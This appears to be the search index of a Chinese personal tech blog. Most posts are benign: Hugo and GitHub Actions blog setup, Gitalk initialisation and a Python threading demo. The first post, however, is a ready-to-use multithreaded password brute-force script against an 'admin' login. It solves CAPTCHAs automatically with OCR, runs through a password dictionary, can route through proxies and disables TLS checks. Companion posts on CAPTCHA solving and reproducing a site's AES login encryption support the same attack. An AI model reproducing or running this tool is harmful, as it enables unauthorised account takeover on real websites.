[{"categories":["工具开发"],"content":"验证码自动识别、多线程爆破单个参数","date":"2022-12-19","objectID":"/6/","tags":["Python"],"title":"验证码自动识别的多线程爆破脚本","uri":"/6/"},{"categories":["工具开发"],"content":" 修改目标url的登录路径和验证码路径 修改相应的请求头和请求参数 将字典放到当前目录下命名为password.txt 如需挂代理可自行设置代理 import requests import json import fileinput import ddddocr import queue import threading import urllib3 from colorama import Fore from rich.progress import Progress import sys # 控制最大线程量 sem=threading.Semaphore(10) url = '' uname = 'admin' ocr = ddddocr.DdddOcr(show_ad=False) urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) headers = { } proxies = { } # 测试代理 def testProxies(): response=requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5, verify=False) return json.loads(response.text)['origin'] # 获取验证码 def getCaptcha(AuthSession): response = AuthSession.get(url + '/验证码路径', headers=headers, proxies=proxies, timeout=5, verify=False) res = ocr.classification(response.content) return res #登陆请求 def login(AuthSession,uname,pwd,sem,progress,task): try: u = url + '/登录路径' d = { 'username': uname, 'password': pwd, 'captcha':getCaptcha(AuthSession) } response = AuthSession.post(u, data=d, headers=headers, proxies=proxies, timeout=5, verify=False) response = json.loads(response.text) if response['msg'] == '密码错误': print(Fore.RED + response['msg'] + ' 密码：' + pwd) elif response['msg'] == \"验证码错误\": print(Fore.YELLOW + response['msg'] + ' 密码：' + pwd) login(AuthSession,uname,pwd,sem,progress,task) return else: print(Fore.GREEN + response['msg'] + ' 密码：' + pwd) sys.exit() if not progress.finished: progress.update(task, advance=1) sem.release() except: print('login发生错误') def main(): threads = [] q = queue.Queue() with fileinput.input(files=(r'password.txt'),openhook=fileinput.hook_encoded(\"utf-8\")) as f: for line in f: q.put(line) with Progress() as progress: task = progress.add_task(\"[yellow]本地IP\"+testProxies(), total=q.qsize()) for i in range(q.qsize()): sem.acquire() AuthSession = requests.session() td = threading.Thread(target=login,args=(AuthSession,uname,q.get().replace(\"\\n\", \"\"),sem,progress,task)) threads.append(td) td.start() for t in threads: t.join() if __name__==\"__main__\": main() ","date":"2022-12-19","objectID":"/6/:0:0","tags":["Python"],"title":"验证码自动识别的多线程爆破脚本","uri":"/6/"},{"categories":["工具开发"],"content":"ddddocr的简单使用","date":"2022-12-14","objectID":"/5/","tags":["Python"],"title":"三行代码解决验证码","uri":"/5/"},{"categories":["工具开发"],"content":"安装依赖 pip install ddddocr ","date":"2022-12-14","objectID":"/5/:1:0","tags":["Python"],"title":"三行代码解决验证码","uri":"/5/"},{"categories":["工具开发"],"content":"实现代码 import ddddocr ocr = ddddocr.DdddOcr(show_ad=False) # 通过img_base64识别验证码，img_base64不包含数据头 res = ocr.classification(img_base64) # 通过img_bytes识别验证码，将图片下载到本地识别验证码 with open('1.png', 'rb') as f: img_bytes = f.read() res = ocr.classification(img_bytes) print(res) 信息 参考：https://cloud.tencent.com/developer/article/1853149 ","date":"2022-12-14","objectID":"/5/:2:0","tags":["Python"],"title":"三行代码解决验证码","uri":"/5/"},{"categories":["逆向研究"],"content":"通过Nodejs进行AES加密后采用Python脚本调用","date":"2022-12-13","objectID":"/4/","tags":["Python","Nodejs"],"title":"逆向AES加密脚本","uri":"/4/"},{"categories":["逆向研究"],"content":"Nodejs进行AES加密 注意 本地需要Nodejs环境 var CryptoJS = require(\"crypto-js\"); // 只需找到key和iv var key; var iv; function encrypt(data) { encryptedKey = CryptoJS.AES.encrypt(data, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }).toString() return encryptedKey } ","date":"2022-12-13","objectID":"/4/:1:0","tags":["Python","Nodejs"],"title":"逆向AES加密脚本","uri":"/4/"},{"categories":["逆向研究"],"content":"python脚本调用 import execjs result = execjs.compile(open('test.js','r').read()).call('encrypt','test') print(result) ","date":"2022-12-13","objectID":"/4/:2:0","tags":["Python","Nodejs"],"title":"逆向AES加密脚本","uri":"/4/"},{"categories":["工具开发"],"content":"简单记录一下大佬的脚本以防丢失","date":"2022-12-08","objectID":"/3/","tags":["Python","Gitalk"],"title":"Python自动初始化Gitalk","uri":"/3/"},{"categories":["工具开发"],"content":"Python自动初始化Gitalk 信息 参考：https://www.xiaobinqt.cn/gitalk-init-issue/ 复制themes/LoveIt/layouts/partials/comment.html到layouts/partials/comment.html 修改第27行.Date=\u003e(md5 .RelPermalink) 大佬的脚本： import hashlib import json import sys import time import requests site_url = \"https://xiaobinqt.github.io\" if len(sys.argv) != 4: print(\"Usage:\") print(sys.argv[0], \"token username repo_name\") sys.exit(1) # issue 的 body 就是文章的 URL token = sys.argv[1] username = sys.argv[2] repo_name = sys.argv[3] issue_map = dict() ## [issue_body] = {\"issue_number\": issue_number, \"issue_title\": issue_title} posts_map = dict() # [post_url] = {\"post_uri\":uri,\"post_date\":date,\"post_title\":title} def get_all_gitalk_issues(token, username, repo_name): for i in range(1, 150): # 15000 个 issue 基本够用了,不够可以再加 _, ret = get_issues_page(i) time.sleep(5) if ret == -1: break ## 删除的文章不管.... ## 文章 title 修改了的文章该怎么处理？ 标题可能修改,但是 uri 不变,issue 的 body 是文章地址,只要文章地址不变，就可以直接 update issue title ## uri 如果也变了，相当于是文件的重命名了，这时只能去手动 update issue title 了?..... def update_issue(issue_number, title): if title == \"\": return url = 'https://api.github.com/repos/%s/%s/issues/%d' % (username, repo_name, issue_number) print(\"update_issue url: %s\" % url) data = { 'title': title, } print(\"create_issue req json: %s\" % json.dumps(data)) r = requests.patch(url, data=json.dumps(data), headers={ \"Authorization\": \"token %s\" % token, }, verify=False) if r.status_code == 200: print(\"update_issue success\") else: print(\"update_issue fail, status_code: %d,title: %s,issue_number: %d\" % (r.status_code, title, issue_number)) # 获取所有 label 为 gitalk 的 issue def get_issues_page(page=1): url = 'https://api.github.com/repos/%s/%s/issues?labels=Gitalk\u0026per_page=100\u0026page=%d' % (username, repo_name, page) print(\"get_issues url: %s\" % url) r = requests.get(url, headers={ \"Authorization\": \"token %s\" % token, \"Accept\": \"application/vnd.github.v3+json\" }) if r.status_code != 200: print(\"get_issues_page fail, status_code: %d\" % r.status_code) sys.exit(2) if r.json() == []: return (issue_map, -1) for issue in r.json(): if issue['body'] not in issue_map and issue[\"body\"] != \"\": issue_map[issue['body']] = { \"issue_number\": issue['number'], \"issue_title\": issue['title'] } return (issue_map, 0) # 通过 public/index.json 获取所有的文章 def get_post_titles(): with open(file='public/index.json', mode='r', encoding='utf-8') as f: file_data = f.read() if file_data == \"\" or file_data == [] or file_data == {}: return posts_map file_data = json.loads(file_data) for data in file_data: key = \"%s%s\" % (site_url, data['uri']) if key not in posts_map: posts_map[key] = { \"post_uri\": data['uri'], \"post_date\": data['date'], \"post_title\": data['title'] } return posts_map def create_issue(title=\"\", uri=\"\", date=\"\"): if title == \"\": return url = 'https://api.github.com/repos/%s/%s/issues' % (username, repo_name) print(\"create_issue title: %s uri: %s date: %s\" % (title, uri, date)) m = hashlib.md5() m.update(uri.encode('utf-8')) urlmd5 = m.hexdigest() data = { 'title': title, 'body': '%s%s' % (site_url, uri), 'labels': [ 'Gitalk', urlmd5 ] } print(\"create_issue req json: %s\" % json.dumps(data)) r = requests.post(url, data=json.dumps(data), headers={ \"Authorization\": \"token %s\" % token, }) if r.status_code == 201: print(\"create_issue success\") else: print(\"create_issue fail, status_code: %d,title: %s,req url: %s \\n\" % (r.status_code, title, url)) # 创建 gitalk 创建 issue,如果 issue 已经存在，则不创建 def init_gitalk(): for post_url, item in posts_map.items(): ## 标题被修改了 if post_url in issue_map and item['post_title'] != issue_map[post_url]['issue_title']: update_issue(issue_map[post_url][\"issue_number\"], item['post_title']) elif post_url not in issue_map: # 新增的文章 print(\"title: [%s] , body [%s] issue 不存在,创建...\" % (item[\"post_title\"], post_url)) create_issue(item[\"post_title\"], item[\"post_uri\"], item[\"post_date\"]) # 延迟 5 秒，防止 github api 请求过于频繁： https://docs.github.com/en/rest/guides/best-practices-for-integrators#dealing-with-secondary-rate-limits time.sleep(5) def get_uri_md5(uri): m = ha","date":"2022-12-08","objectID":"/3/:1:0","tags":["Python","Gitalk"],"title":"Python自动初始化Gitalk","uri":"/3/"},{"categories":["工具开发"],"content":"Gitalk页面不加载问题 解决方法： 复制themes/LoveIt/layouts/partials/comment.html到layouts/partials/comment.html 将第3行 {{- $comment := .Scratch.Get \"comment\" | default dict -}} 修改为： {{- $comment := .Site.Params.page.comment | default dict -}} ","date":"2022-12-08","objectID":"/3/:2:0","tags":["Python","Gitalk"],"title":"Python自动初始化Gitalk","uri":"/3/"},{"categories":["工具开发"],"content":"Python多线程卖票包含信号量限制、进度条、彩色字体","date":"2022-12-03","objectID":"/2/","tags":["Python"],"title":"Python多线程卖票","uri":"/2/"},{"categories":["工具开发"],"content":" #!/usr/bin/python3 import threading import time import queue from colorama import Fore from rich.progress import Progress tt = 50 threads = [] q = queue.Queue() # 控制最大可用窗口数 sem=threading.Semaphore(5) def sale(sem,progress,task): while not q.empty(): if threading.current_thread().name == \"第1窗口\": print(Fore.GREEN + \"{}：卖出第{}张票\".format(threading.current_thread().name,q.get())) elif threading.current_thread().name == \"第2窗口\": print(Fore.MAGENTA + \"{}：卖出第{}张票\".format(threading.current_thread().name,q.get())) elif threading.current_thread().name == \"第3窗口\": print(Fore.BLUE + \"{}：卖出第{}张票\".format(threading.current_thread().name,q.get())) elif threading.current_thread().name == \"第4窗口\": print(Fore.CYAN + \"{}：卖出第{}张票\".format(threading.current_thread().name,q.get())) else: print(Fore.YELLOW + \"{}：卖出第{}张票\".format(threading.current_thread().name,q.get())) if not progress.finished: progress.update(task, advance=1) time.sleep(5) sem.release() def main(): for i in range(tt): q.put(i+1) with Progress() as progress: task = progress.add_task(\"[cyan]Processing\", total=tt) # 控制窗口数 for j in range(20): sem.acquire() td = threading.Thread(target=sale,args=(sem,progress,task),name=\"第\"+str(j+1)+\"窗口\") # 添加线程到线程列表 threads.append(td) td.start() # 等待所有线程完成后退出主线程 for t in threads: t.join() print(Fore.RED +\"票已卖完！！！\") if __name__==\"__main__\": main() 注意 存在问题 该脚本由于sale()函数采用while循环，当票被卖空才会跳出循环，导致当前线程会一直持续到票卖空才结束，如此一来线程只会创建到最大线程数5个（由信号量控制），用这5个线程卖完所有的票。这样38行处的控制窗口数处只需大于最大线程数5便可，无太多意义 在一般的脚本中，多线程执行的函数一般不会存在像该脚本如此的循环（一直循环消耗样本直到结束），正常情况下第38行处应为样本总数，这样才能实现100张票创建100个线程去买，通过信号量来控制最大线程数，线程执行完毕自动销毁 该脚本需做修改： 去除sale()函数中的while循环 第38行处20改为样本总数tt ","date":"2022-12-03","objectID":"/2/:0:0","tags":["Python"],"title":"Python多线程卖票","uri":"/2/"},{"categories":["学习分享"],"content":"通过Hugo和Actions快速搭建github博客","date":"2022-11-15","objectID":"/1/","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["学习分享"],"content":"前言 简单叙述一下流程，先在本地仓库搭建好Hugo博客环境，再在github上创建两个仓库，其中一个可为任意名称的私有库暂且称其为Blog_Private，另一个必须是：github用户名.github.io为命名的公开库，假设你的用户名为xiaoming，该仓库名应为：xiaoming.github.io，且必须为公开库 本地仓库 Blog_Private库 xiaoming.github.io库 以上三个仓库准备好之后，再进行三步配置便可完成 第一步，将本地仓库提交到Blog_Private库中 第二步，配置Actions文件 第三步，生成并设置密钥 ","date":"2022-11-15","objectID":"/1/:1:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["学习分享"],"content":"思路 本地同步Blog_Private库，Blog_Private库通过Actions自动部署静态页面到公开库xiaoming.github.io中，通过域名xiaoming.github.io访问到公开库xiaoming.github.io的pages中查看博客 ","date":"2022-11-15","objectID":"/1/:1:1","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["学习分享"],"content":"好处 该方法是把源码部署到私有库中，将自动生成的静态页面放在公开库xiaoming.github.io中，相较于直接将源码部署到xiaoming.github.io中更加安全方便 ","date":"2022-11-15","objectID":"/1/:1:2","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["学习分享"],"content":"部署本地环境 注意 只适用于Hugo系统 推荐下载extended版本，该版本可自定义样式 Hugo下载地址：https://github.com/gohugoio/hugo/releases 解压到合适位置，配置hugo.exe的环境变量，方便使用命令行 这里参考LoveIt主题的文档：https://hugoloveit.com/zh-cn/theme-documentation-basics/ # 创建一个网站并进入 hugo new site my_website cd my_website # 通过git下载主题 # git安装参考：https://blog.csdn.net/mukes/article/details/115693833，几乎可以一路默认 git init git submodule add https://github.com/dillonzq/LoveIt.git themes/LoveIt # 修改config.toml配置文件，可进入https://hugoloveit.com/zh-cn/theme-documentation-basics/，作为配置参考 # 中文需要在第二行添加一条配置 defaultContentLanguage = \"zh-cn\" # 生成第一篇文章，在first_post.md随意输入，draft: true 改为 draft: false hugo new posts/first_post.md # 本地启动测试 hugo serve # 访问 http://127.0.0.1:1313 能成功访问到并能正常打开文章，本地环境便部署成功 还有很多主题可供选择：https://themes.gohugo.io/，使用时可参考Demo文档 文章开头可参考 --- title: \"test\" date: 1900-01-01 categories: [\"test\"] tags: [\"test\"] description: \"test\" draft: false --- \u003c!--more--\u003e ","date":"2022-11-15","objectID":"/1/:2:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["学习分享"],"content":"Git同步本地和远程仓库 通过HTTPS协议连接GitHub仓库，参考：https://www.cnblogs.com/liyan-blogs/p/15153764.html 过程中会遇到空目录不上传的问题，可在空目录中创建.gitkeep文件作为占位符 注意这里同步的是Blog_Private仓库 # 配置git git config --global user.name “your name” git config --global user.email “your email” # 在需要同步的本地仓库，执行初始化 git init # git关联远程仓库地址的三种方式 ## 1.先删后加，add是需要先删处再添加，origin默认推荐仓库名 git remote remove origin git remote add origin https://github.com/test/test.git ## 2.修改，set-url是在已有连接时修改关联远程数据库 git remote set-url \u003cremote_name\u003e \u003cremote_url\u003e git remote set-url origin https://github.com/test/test.git ## 3.直接修改config文件 git config -e # 获取token，在连接过程中会需要认证，选择token认证 右上角头像 --\u003e Settings --\u003e Developer Settings --\u003e Personal access tokens(classic) # 将远程仓库的文件pull到本地 git pull --rebase origin master # 提交代码小脚本:upload.bat @echo off cd 本地仓库根目录 git status # 查看代码状态 git add . # 将代码添加到暂存区，(.代表该目录下所有文件、还可用*.md等等) git commit -m \"first commit\" # 将代码提交到本地仓库(后跟该次提交的名称) git push origin master # 将代码push到远程仓库 pause ","date":"2022-11-15","objectID":"/1/:3:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["学习分享"],"content":"配置Actions文件 注意 在Blog_Private仓库的Actions中自定义一个workflows 配置如下，只适用于Hugo系统 name: GitHub Pages on: push: branches: - master jobs: deploy: runs-on: ubuntu-20.04 steps: - name: Checkout repositories uses: actions/checkout@v2 with: submodules: true fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: 'latest' - name: Build run: hugo - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: deploy_key: ${{ secrets.ACTIONS_DEPLOY_KEY }} external_repository: xiaoming/xiaoming.github.io # 只需修改此处，改为自己的用户名 publish_branch: master publish_dir: ./public 配置完成后，再次点击Actions，点击中间main.yml，点击deploy，若发现只有Deploy步骤报错，便配置成功 此处有两个问题 secrets.ACTIONS_DEPLOY_KEY私钥和xiaoming.github.io的公钥未配置导致Deploy步骤报错 若未出现则无需理会。Actions会自动部署到xiaoming.github.io库的master分支，而现在xiaoming.github.io库可能默认为main分支，需要重命名main为master ","date":"2022-11-15","objectID":"/1/:4:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["学习分享"],"content":"生成并设置密钥 此处可参考：https://github.com/peaceiris/actions-gh-pages，Create SSH Deploy Key 处，有详细的位置图标 执行以下命令会生成两个文件 gh-pages.pub 是公钥 gh-pages 是私钥 ssh-keygen -t rsa -b 4096 -C \"$(git config user.email)\" -f gh-pages -N \"\" 公钥gh-pages.pub放在xiaoming.github.io中Settings的Deploy keys中，名字随意 私钥gh-pages放在Blog_Private中Settings的Secrets的Actions的New repository secrets，名字必须为ACTIONS_DEPLOY_KEY 配置完成后，再次点击Actions，点击中间main.yml，点击右边Re-run all jobs，无报错，便完成 ","date":"2022-11-15","objectID":"/1/:5:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["学习分享"],"content":"自定义样式 信息 参考：https://lucas-0.github.io/ 创建文件：\\assets\\css\\\\_custom.scss // ============================== // Custom style // 自定义样式 // ============================== @import url('https://fonts.googleapis.com/css2?family=Rock+Salt\u0026family=Noto+Serif+SC\u0026family=Roboto+Slab:wght@100..900\u0026display=swap'); .page { position: relative; max-width: 800px; //宽度限制800 margin: 0 auto; } 创建文件：\\assets\\css\\\\_override.scss // ============================== // Override Variables // 覆盖变量 // ============================== // @import url('https://fonts.proxy.ustclug.org/css2?family=Rock+Salt\u0026family=Noto+Serif+SC:wght@400;600;700\u0026family=Roboto+Slab:wght@400;600;700\u0026display=swap'); //使用中科大加速 // @import url('https://fonts.googleapis.com/css2?family=Rock+Salt\u0026family=Noto+Serif+SC:wght@200..900\u0026family=Roboto+Slab:wght@100..900\u0026display=swap'); // Font and Line Height $global-font-family: \"Roboto Slab\", \"Noto Serif SC\", \"PingFang SC\", \"Hiragino Sans GB\", \"Microsoft Yahei\", \"WenQuanYi Micro Hei\", \"Segoe UI Emoji\", \"Segoe UI Symbol\", Helvetica, Arial, -apple-system, system-ui, sans-serif; $global-font-size: 18px; $global-font-weight: 400; //粗细 $global-line-height: 1.75rem; //文本行的基线间的距离 原始1.5rem会让屏幕宽不够时h1重合 h1{font-size:1.5em;} //原始为2em，会与行高1.5rem冲突，修改为1.5em $header-title-font-family: \"Rock Salt\", -apple-system, system-ui, sans-serif; // Color of the secondary text $global-font-secondary-color: #7d7d84; ","date":"2022-11-15","objectID":"/1/:6:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["学习分享"],"content":"集成不蒜子统计访问量 信息 参考：https://xwi88.com/hugo-plugin-busuanzi/ 不蒜子：http://busuanzi.ibruce.info/ 将自定义配置添加在[params.page]文章页面全局配置里 # xwi88 自定义配置 xwi88Cfg [params.xwi88Cfg] [params.xwi88Cfg.summary] update = true # summary 更新日期显示 [params.xwi88Cfg.page] update = true # pages 更新日期显示 [params.xwi88Cfg.busuanzi] enable = true # custom uv for the whole site site_uv = true site_uv_pre = '\u003ci class=\"fa fa-user\"\u003e\u003c/i\u003e' # 字符或提示语 site_uv_post = '' # custom pv for the whole site site_pv = true site_pv_pre = '\u003ci class=\"fa fa-eye\"\u003e\u003c/i\u003e' # site_pv_post = '\u003ci class=\"far fa-eye fa-fw\"\u003e\u003c/i\u003e' site_pv_post = '' # custom pv span for one page only page_pv = true page_pv_pre = '\u003ci class=\"far fa-eye fa-fw\"\u003e\u003c/i\u003e' page_pv_post = '' 在layouts/partials/plugin目录里创建文件busuanzi.html，如果不存在该目录就创建目录，文件内容如下： {{ if .params.enable }} {{ if eq .bsz_type \"footer\" }} {{/* 只有 footer 才刷新，防止页面进行多次调用，计数重复; 只要启用就计数，显示与否看具体设置 */}} \u003cscript async src=\"//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js\"\u003e\u003c/script\u003e {{ end }} {{ if or (eq .params.site_pv true) (eq .params.site_uv true) (eq .params.page_pv true) }} {{ if eq .bsz_type \"footer\" }} \u003csection\u003e {{ if eq .params.site_pv true }} \u003cspan id=\"busuanzi_container_value_site_pv\"\u003e {{- with .params.page_pv_pre -}} {{ . | safeHTML }} {{ end }} \u003cspan id=\"busuanzi_value_site_pv\"\u003e\u003c/span\u003e \u003c/span\u003e {{ end }} {{ if and (eq .params.site_pv true) (eq .params.site_uv true) }} \u0026nbsp;|\u0026nbsp; {{ end }} {{ if eq .params.site_uv true }} \u003cspan id=\"busuanzi_container_value_site_uv\"\u003e {{- with .params.site_uv_pre -}} {{ . | safeHTML }} {{ end }} \u003cspan id=\"busuanzi_value_site_uv\"\u003e\u003c/span\u003e \u003c/span\u003e {{ end }} \u003c/section\u003e {{ end }} {{/* page pv 只在 page 显示 */}} {{ if and (eq .params.page_pv true) (eq .bsz_type \"page-reading\") }} \u003cspan id=\"busuanzi_container_value_page_pv\"\u003e {{- with .params.page_pv_pre -}} {{ . | safeHTML }} {{ end }} \u003cspan id=\"busuanzi_value_page_pv\"\u003e\u003c/span\u003e\u0026nbsp; {{- T \"views\" -}} \u003c/span\u003e {{ end }} {{ end }} {{ end }} 复制themes/LoveIt/layouts/partials/footer.html到layouts/partials/footer.html 在第9行{{- end -}}后回车添加： {{- /* busuanzi plugin */ -}} {{- partial \"plugin/busuanzi.html\" (dict \"params\" .Site.Params.xwi88Cfg.busuanzi \"bsz_type\" \"footer\") -}} 复制themes/LoveIt/layouts/posts/single.html到layouts/posts/single.html 在第62行{{- end -}}后回车添加： {{- /* busuanzi plugin */ -}} {{- partial \"plugin/busuanzi.html\" (dict \"params\" .Site.Params.xwi88Cfg.busuanzi \"bsz_type\" \"page-reading\") -}} 注意 本地测试时出现大量的访问量是正常情况，部署到服务器上后，通过独自的url访问便会恢复正常 ","date":"2022-11-15","objectID":"/1/:7:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"}]